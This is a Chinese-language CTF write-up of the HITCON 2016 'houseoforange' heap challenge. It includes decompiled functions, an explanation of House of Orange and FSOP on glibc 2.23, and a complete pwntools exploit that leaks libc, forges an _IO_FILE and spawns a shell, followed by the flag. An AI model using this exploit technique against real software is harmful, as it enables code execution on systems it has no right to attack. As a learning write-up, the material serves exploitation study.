# houseoforange_hitcon_2016

[题目地址](https://buuoj.cn/challenges#houseoforange_hitcon_2016)

这就是大名鼎鼎的以一己之力开拓新考点的house of orange吗？

保护全开，懒得放了，直接看main函数。

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // eax

  sub_1218();
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      v3 = sub_C65(a1, a2);
      if ( v3 != 2 )
        break;
      see();
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        upgrade();
      }
      else
      {
        if ( v3 == 4 )
        {
          puts("give up");
          exit(0);
        }
LABEL_13:
        a1 = (__int64)"Invalid choice";
        puts("Invalid choice");
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_13;
      build();
    }
  }
}
```

创建函数build也没啥特殊的，不过限制了申请的house数量为4，同时限制申请house的大小，防house of force。

```c
int __fastcall build(__int64 a1, __int64 a2)
{
  unsigned int size; // [rsp+8h] [rbp-18h]
  int size_4; // [rsp+Ch] [rbp-14h]
  _QWORD *v5; // [rsp+10h] [rbp-10h]
  _DWORD *v6; // [rsp+18h] [rbp-8h]

  if ( count > 3u )
  {
    puts("Too many house");
    exit(1);
  }
  v5 = malloc(0x10uLL);
  printf("Length of name :");
  size = sub_C65("Length of name :", a2);
  if ( size > 0x1000 )
    size = 4096;
  v5[1] = malloc(size);
  if ( !v5[1] )
  {
    puts("Malloc error !!!");
    exit(1);
  }
  printf("Name :");
  sub_C20(v5[1], size);
  v6 = calloc(1uLL, 8uLL);
  printf("Price of Orange:");
  *v6 = sub_C65("Price of Orange:", 8LL);
  sub_CC4();
  printf("Color of Orange:");
  size_4 = sub_C65("Color of Orange:", 8LL);
  if ( size_4 != 56746 && (size_4 <= 0 || size_4 > 7) )
  {
    puts("No such color");
    exit(1);
  }
  if ( size_4 == 56746 )
    v6[1] = 56746;
  else
    v6[1] = size_4 + 30;
  *v5 = v6;
  houses = v5;
  ++count;
  return puts("Finish");
}
```

输出函数see输出每个house的名称和颜色信息。对我们比较麻烦的点在于没有提供索引操作，永远只能输出最近申请的那个。

```c
int see()
{
  int v0; // eax
  int result; // eax
  int v2; // eax

  if ( !houses )
    return puts("No such house !");
  if ( *(_DWORD *)(*houses + 4LL) == 56746 )
  {
    printf("Name of house : %s\n", (const char *)houses[1]);
    printf("Price of orange : %d\n", *(unsigned int *)*houses);
    v0 = rand();
    result = printf("\x1B[01;38;5;214m%s\x1B[0m\n", *((const char **)&unk_203080 + v0 % 8));
  }
  else
  {
    if ( *(int *)(*houses + 4LL) <= 30 || *(int *)(*houses + 4LL) > 37 )
    {
      puts("Color corruption!");
      exit(1);
    }
    printf("Name of house : %s\n", (const char *)houses[1]);
    printf("Price of orange : %d\n", *(unsigned int *)*houses);
    v2 = rand();
    result = printf("\x1B[%dm%s\x1B[0m\n", *(unsigned int *)(*houses + 4LL), *((const char **)&unk_203080 + v2 % 8));
  }
  return result;
}
```

最后就是upgrade函数了。问了“Length of name”，标准的堆溢出。当然这个函数也很抠，只给修改3次。

```c
int upgrade()
{
  _DWORD *v1; // rbx
  unsigned int v2; // [rsp+8h] [rbp-18h]
  int v3; // [rsp+Ch] [rbp-14h]

  if ( upgrade_count > 2u )
    return puts("You can't upgrade more");
  if ( !houses )
    return puts("No such house !");
  printf("Length of name :");
  v2 = sub_C65();
  if ( v2 > 0x1000 )
    v2 = 4096;
  printf("Name:");
  sub_C20(houses[1], v2);
  printf("Price of Orange: ");
  v1 = (_DWORD *)*houses;
  *v1 = sub_C65();
  sub_CC4();
  printf("Color of Orange: ");
  v3 = sub_C65();
  if ( v3 != 56746 && (v3 <= 0 || v3 > 7) )
  {
    puts("No such color");
    exit(1);
  }
  if ( v3 == 56746 )
    *(_DWORD *)(*houses + 4LL) = 56746;
  else
    *(_DWORD *)(*houses + 4LL) = v3 + 30;
  ++upgrade_count;
  return puts("Finish");
}
```

这时就发现问题了。之前我做的题最多是edit功能缺席，free功能一直是好朋友和主力，现在直接没这个选项了。又是学习[wp](https://www.cnblogs.com/LynneHuan/p/14696780.html)的一天。根据[ctf wiki](https://ctf-wiki.org/en/pwn/linux/user-mode/heap/ptmalloc2/house-of-orange/)所说，House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)，进而泄露基地址。这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。我们这道题只能申请4次堆块，top chunk正常来说不会大小不够，但是我们可以溢出啊！通过溢出漏洞伪造top chunk size不就行了？注意伪造时要注意下面4点：

1. 伪造的 size 必须要对齐到内存页
2. size 要大于 MINSIZE(0x10)
3. size 要小于之后申请的 chunk size + MINSIZE(0x10)
4. size 的 prev inuse 位必须为 1

这里的对齐是以内存页为单位，通常是4kb。比如有一个top chunk 的 size 大小是 20fe1，起始位置是0x602020，通过计算即可得知 0x602020+0x20fe0=0x623000 是对于 0x1000（4kb）对齐的。因此我们伪造的 fake_size 可以是 0x0fe1、0x1fe1、0x2fe1、0x3fe1 等对齐4kb的 size。伪造完成后，我们申请一个比top chunk size大的chunk就能让原有的top chunk进入unsorted bin了。接着再申请一个堆块，这个堆块会从unsorted bin中已有的chunk里切割给我们，获得的chunk会带着宝贵的main_arena地址信息，此时就能泄露基址了。

[ctf-wiki](https://ctf-wiki.org/en/pwn/linux/user-mode/io-file/fsop)里有讲FSOP。[FSOP](https://phot0n.com/2022/09/06/%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%8EFSOP)的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。这个东西有很多种触发方式，这里就针对这道题的环境：64位+libc-2.23.so，利用`malloc_printerr->_libc_message->abort->_IO_flush_all_lockup->_IO_overflow`这条调用链。这条链的硬性要求为`fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base`。习惯把笔记做exp上，直接放exp。

```python
from pwn  import *
import functools

sh = remote("node4.buuoj.cn",29909)
LOG_ADDR = lambda x, y: log.success('{} ===> {}'.format(x, hex(y)))
int16 = functools.partial(int, base=16)
context.arch="amd64"
context.os="linux"
context.endian="little"

main_arena_offset = 0x3c4b20

def build_house(length:int, name, price:int=0xff, color:int=1):
    sh.sendlineafter("Your choice : ", "1")
    sh.sendlineafter("Length of name :", str(length))
    sh.sendafter("Name :", name)
    sh.sendlineafter("Price of Orange:", str(price))
    sh.sendlineafter("Color of Orange:", str(color))
    sh.recvuntil("Finish\n")

def see_house():
    sh.sendlineafter("Your choice : ", "2")
    name_msg = sh.recvline_startswith("Name of house : ")
    price_msg = sh.recvline_startswith("Price of orange : ")
    log.success("name_msg:{}\nprice_msg:{}".format(name_msg, price_msg))
    return name_msg, price_msg


def upgrade_house(length:int, name, price:int=0xff, color:int=1):
    sh.sendlineafter("Your choice : ", "3")
    sh.sendlineafter("Length of name :", str(length))
    sh.sendafter("Name:", name)
    sh.sendlineafter("Price of Orange: ", str(price))
    sh.sendlineafter("Color of Orange: ", str(color))
    sh.recvuntil("Finish\n")

build_house(0x10, "aaaa")

# change the size of top_chunk to 0xfa1
upgrade_house(0x100, b"a" * 0x38 + p64(0xfa1))

# house of orange
build_house(0x1000, "cccc")

# leak addr
build_house(0x400, b"a" * 8)
msg, _ = see_house()
leak_libc_addr = msg[0x18: 0x18+6]
leak_libc_addr = u64(leak_libc_addr.ljust(8, b"\x00"))

LOG_ADDR("leak_libc_addr", leak_libc_addr) #此处泄露的是类似unsorted bin attack中残留的main_arena地址
libc_base_addr = leak_libc_addr - main_arena_offset - 1640
LOG_ADDR("libc_base_addr", libc_base_addr)
io_list_all_addr = libc_base_addr + 3953952

upgrade_house(0x10, "a" * 0x10)
msg, _ = see_house()
heap_addr = msg[0x20:0x26]
heap_addr = u64(heap_addr.ljust(8, b"\x00"))
LOG_ADDR("heap_addr", heap_addr) #这里泄露的是切割后剩下部分的残留堆地址，看wp或者ctf wiki里面的截图会比较清楚

payload = flat(p64(0) * 3 + p64(libc_base_addr + 283536), #libc_base_addr + 283536是system地址
                0x400 * "\x00",
                "/bin/sh\x00", 
                0x61,
                0, 
                io_list_all_addr-0x10,
                0, 
                0x1,  # _IO_write_ptr
                0xa8 * b"\x00",
                heap_addr+0x10
                ) #这块肯定是根据IO_FILE结构体构造的，就是怎么触发的我有点看不懂
upgrade_house(0x600, payload)
sh.sendlineafter("Your choice : ", "1")
sh.interactive()
```

## Flag
> flag{4b05cb90-1228-476c-9c49-37652a5bb232}